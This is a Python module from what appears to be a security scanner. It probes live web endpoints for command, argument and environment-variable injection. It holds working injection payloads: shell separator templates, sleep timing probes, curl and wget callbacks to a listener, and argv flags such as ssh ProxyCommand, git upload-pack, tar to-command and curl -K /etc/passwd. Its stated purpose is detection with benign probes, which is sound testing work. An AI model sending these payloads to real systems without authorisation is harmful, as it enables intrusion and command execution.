#!/usr/bin/env python3
"""
execinject.py - command, argument and env-var injection against a live target.

WHY: the coverage audit found "Command injection" UNCOVERED - no primitive, no manual row, no stage.
`expr_injection` handles expression languages (7*7 style), which is a different sink: a template
evaluator is not a shell. So one of the highest-severity classes in the matrix could not be reported
in any state on a live target, BLOCKED included.

Argument injection (CWE-88) and env-var injection are the same omission one step further out. They
matter because the usual defence - "we never pass a shell string, we use argv" - does not stop them:
`curl -o`, `ssh -o ProxyCommand`, `find -exec`, `git --upload-pack`, `tar --to-command` and
`LD_PRELOAD`/`PYTHONWARNINGS` all reach execution through an argument or an environment variable
rather than through a shell metacharacter.

SAFETY. Every probe here is benign by construction:
  * timing uses sleep only, capped by payloads.SLEEP_CEILING_S, and never on a production-scale loop
  * out-of-band uses a listener we own and a token unique to the run
  * no probe writes, deletes, or runs anything beyond `sleep` and an echo of our own marker
Availability is never the goal: a sleep here is an oracle, not a denial of service.
"""
from __future__ import annotations

import time

from . import (TIMEOUT, Ctx, ProbeResult, blocked, median, not_confirmed, primitive, requests,
               send, sink_hits, start_sink, timed)

# Kept in step with dynamic/payloads.py: a blind oracle must stay well under any sane timeout, and
# a long sleep against a live target is an availability test by another name.
SLEEP_S = 5
SAMPLES = 3

# One separator per shell grammar. Ordered cheapest-signal first.
SEPARATORS = [
    ("semicolon", "; {cmd}"),
    ("and", " && {cmd}"),
    ("pipe", " | {cmd}"),
    ("backtick", "`{cmd}`"),
    ("dollar", "$({cmd})"),
    ("newline", "\n{cmd}"),
    ("cr", "\r{cmd}"),
    ("subshell-quote", "' ; {cmd} ; '"),
    ("dquote", '" ; {cmd} ; "'),
]


def _sleep_cmd(seconds: int) -> list:
    """Both spellings - the target may be POSIX or Windows and we do not know which yet."""
    return [f"sleep {seconds}", f"ping -n {seconds + 1} 127.0.0.1"]


@primitive("cmdi_blind", default_param="q", group="B", cwe="CWE-78",
           needs="a parameter that reaches a subprocess")
def cmdi_blind(base: str, endpoint: str, param: str = "q",
               ctx: Ctx | None = None) -> ProbeResult:
    """Timing differential across the separator matrix.

    Timing is the oracle of last resort because a loaded server is noisy, so this takes a baseline,
    requires the delayed response to clear it by a real margin, and then REPRODUCES before calling
    anything confirmed. A single slow response is not a finding.
    """
    ctx = ctx or Ctx()
    url = f"{base}{endpoint}"

    baseline = []
    for _ in range(SAMPLES):
        try:
            _, dt = timed("GET", url, params={param: "probe"})
        except requests.RequestException as e:
            return blocked("cmdi_blind", endpoint, f"endpoint unreachable: {e}")
        baseline.append(dt)
    base_ms = median(baseline)

    # A delay only counts if it clears the baseline by most of the sleep we asked for.
    threshold = base_ms + (SLEEP_S * 0.6)

    for name, tmpl in SEPARATORS:
        for cmd in _sleep_cmd(SLEEP_S):
            payload = "probe" + tmpl.format(cmd=cmd)
            try:
                _, dt = timed("GET", url, params={param: payload})
            except requests.RequestException:
                continue
            if dt < threshold:
                continue
            # Reproduce. One slow response is noise; two in a row with a matching control is not.
            confirms = 0
            for _ in range(2):
                try:
                    _, again = timed("GET", url, params={param: payload})
                    if again >= threshold:
                        confirms += 1
                except requests.RequestException:
                    pass
            if confirms < 2:
                continue
            # Negative control: same separator, no sleep. If THAT is slow too, it is not our sleep.
            try:
                _, control = timed("GET", url,
                                   params={param: "probe" + tmpl.format(cmd="echo x")})
            except requests.RequestException:
                control = 0.0
            if control >= threshold:
                continue
            return ProbeResult(
                "cmdi_blind", True, endpoint, payload, 0,
                f"{name} separator produced a reproducible {dt:.1f}s delay "
                f"(baseline {base_ms:.1f}s, control {control:.1f}s) - the parameter reaches a shell",
                {"separator": name, "baseline_s": round(base_ms, 2),
                 "delayed_s": round(dt, 2), "control_s": round(control, 2),
                 "reproduced": confirms})
    return not_confirmed("cmdi_blind", endpoint,
                         f"no reproducible timing differential across {len(SEPARATORS)} separators "
                         f"(baseline {base_ms:.1f}s); a blind sink with no timing side effect would "
                         f"not show here - try cmdi_oob")


@primitive("cmdi_oob", default_param="q", group="B", cwe="CWE-78",
           needs="a target that can reach our listener (loopback, or --opt oob_host=...)")
def cmdi_oob(base: str, endpoint: str, param: str = "q",
             ctx: Ctx | None = None) -> ProbeResult:
    """Out-of-band callback - the non-timing proof, and the honest one.

    Reachability is established before the probe runs rather than assumed. A loopback listener is
    not an OOB channel for a remote target: it guarantees a timeout whether or not the bug exists,
    and reporting that as CLEAR is exactly the laundering dynamic/verdict.py was written to stop.
    """
    ctx = ctx or Ctx()
    host = (base.split("//", 1)[-1].split("/", 1)[0] or "").lower()
    is_local = host.startswith(("127.0.0.1", "localhost", "[::1]"))
    if not is_local and not ctx.opts.get("oob_host"):
        return ProbeResult(
            "cmdi_oob", False, endpoint,
            detail="NEEDS-OOB: a remote target cannot reach a loopback listener, so this probe "
                   "was not sent. Supply a reachable callback with --opt oob_host=<host> "
                   "(a tunnel or collaborator you control) to settle this row.",
            evidence={"needs_oob": True, "reason": "no callback channel reachable by the target"})

    url, srv = start_sink()
    if ctx.opts.get("oob_host"):
        url = ctx.opts["oob_host"].rstrip("/") + "/probe"
    try:
        for name, tmpl in SEPARATORS:
            for cmd in (f"curl -s {url}", f"wget -q -O- {url}"):
                payload = "probe" + tmpl.format(cmd=cmd)
                try:
                    send("GET", f"{base}{endpoint}", ctx=ctx,
                         params={param: payload}, timeout=TIMEOUT)
                except requests.RequestException:
                    continue
                time.sleep(0.4)
                if sink_hits():
                    return ProbeResult(
                        "cmdi_oob", True, endpoint, payload, 0,
                        f"{name} separator triggered an outbound callback to our listener - "
                        f"the parameter reaches a shell",
                        {"separator": name, "callback": url, "hits": sink_hits()[:3]})
    finally:
        srv.shutdown()
    return not_confirmed("cmdi_oob", endpoint,
                         "no callback arrived; egress may be filtered, so this does not establish "
                         "that the sink is absent")


@primitive("arg_injection", default_param="url", group="B", cwe="CWE-88",
           needs="a parameter passed as an argv element to a known binary")
def arg_injection(base: str, endpoint: str, param: str = "url",
                  ctx: Ctx | None = None) -> ProbeResult:
    """CWE-88: reach execution through an ARGUMENT, with no shell involved.

    The class that survives the usual fix. Once a codebase moves from `os.system(cmd)` to
    `subprocess.run([bin, arg])` it is considered safe, but if `arg` starts with `-` it is a flag,
    not a value - and several common binaries have flags that read files, write files or run
    commands.
    """
    ctx = ctx or Ctx()
    marker = ctx.fresh_marker("arg")
    sink, srv = start_sink()

    # Each: (label, payload, what a hit would mean)
    attacks = [
        ("curl -o (arbitrary write)", f"-o/tmp/{marker}", "curl wrote to a path we chose"),
        ("curl -K (config file read)", "-K/etc/passwd", "curl parsed a file we named as config"),
        ("curl remote", sink, "the fetcher followed a URL we chose"),
        ("ssh ProxyCommand", f"-oProxyCommand=curl -s {sink}", "ssh ran a command we supplied"),
        ("git upload-pack", f"--upload-pack=curl -s {sink}", "git ran a command we supplied"),
        ("tar to-command", f"--to-command=curl -s {sink}", "tar ran a command we supplied"),
        ("flag terminator", f"--{marker}", "the value was parsed as a flag"),
    ]
    try:
        for label, payload, meaning in attacks:
            try:
                r = send("GET", f"{base}{endpoint}", ctx=ctx,
                         params={param: payload}, timeout=TIMEOUT)
            except requests.RequestException:
                continue
            time.sleep(0.3)
            if sink_hits():
                return ProbeResult(
                    "arg_injection", True, endpoint, payload, r.status_code,
                    f"{label}: {meaning} - the parameter is parsed as an argv FLAG, not a value",
                    {"vector": label, "callback": sink, "hits": sink_hits()[:3]})
            body = (r.text or "").lower()
            # An error naming the flag proves argv reached the binary, even without a callback.
            if marker.lower() in body and ("unknown" in body or "option" in body
                                           or "usage" in body):
                return ProbeResult(
                    "arg_injection", True, endpoint, payload, r.status_code,
                    f"{label}: the binary reported our value as an unrecognised OPTION, which "
                    f"proves the parameter lands in argv where a flag is accepted",
                    {"vector": label, "snippet": (r.text or "")[:300]})
    finally:
        srv.shutdown()
    return not_confirmed("arg_injection", endpoint,
                         "no argv flag was accepted; the value may be validated, or the binary may "
                         "not expose a reachable flag")


@primitive("env_injection", default_param="lang", group="B", cwe="CWE-454",
           needs="a parameter or header that becomes a child-process environment variable")
def env_injection(base: str, endpoint: str, param: str = "lang",
                  ctx: Ctx | None = None) -> ProbeResult:
    """Env-var injection: the third way into a subprocess that takes no shell and no flags.

    Detection-leaning. A confirmed callback is a finding; anything less is a lead, because proving a
    variable reached a child's environment usually needs the source.
    """
    ctx = ctx or Ctx()
    sink, srv = start_sink()
    vectors = {
        "LD_PRELOAD": "/nonexistent.so",
        "PYTHONWARNINGS": f"all:0:antigravity.x:0:0",
        "BASH_ENV": sink,
        "ENV": sink,
        "GIT_SSH_COMMAND": f"curl -s {sink}",
        "PERL5OPT": "-Mbase",
    }
    try:
        for name, value in vectors.items():
            for carrier in ("param", "header"):
                try:
                    if carrier == "param":
                        r = send("GET", f"{base}{endpoint}", ctx=ctx,
                                 params={param: value, name: value}, timeout=TIMEOUT)
                    else:
                        r = send("GET", f"{base}{endpoint}", ctx=ctx,
                                 headers={name.replace("_", "-"): value}, timeout=TIMEOUT)
                except requests.RequestException:
                    continue
                time.sleep(0.25)
                if sink_hits():
                    return ProbeResult(
                        "env_injection", True, endpoint, f"{name}={value}", r.status_code,
                        f"{name} supplied via {carrier} reached a child process environment and "
                        f"caused an outbound callback",
                        {"variable": name, "carrier": carrier, "hits": sink_hits()[:3]})
                body = (r.text or "")
                if "nonexistent.so" in body or "antigravity" in body:
                    return ProbeResult(
                        "env_injection", False, endpoint, f"{name}={value}", r.status_code,
                        f"LEAD: the response echoes a loader/interpreter error for {name}, which "
                        f"means our value reached a child process environment - confirm the sink",
                        {"lead": True, "variable": name, "snippet": body[:300]})
    finally:
        srv.shutdown()
    return not_confirmed("env_injection", endpoint,
                         "no environment variable we supplied reached a child process")
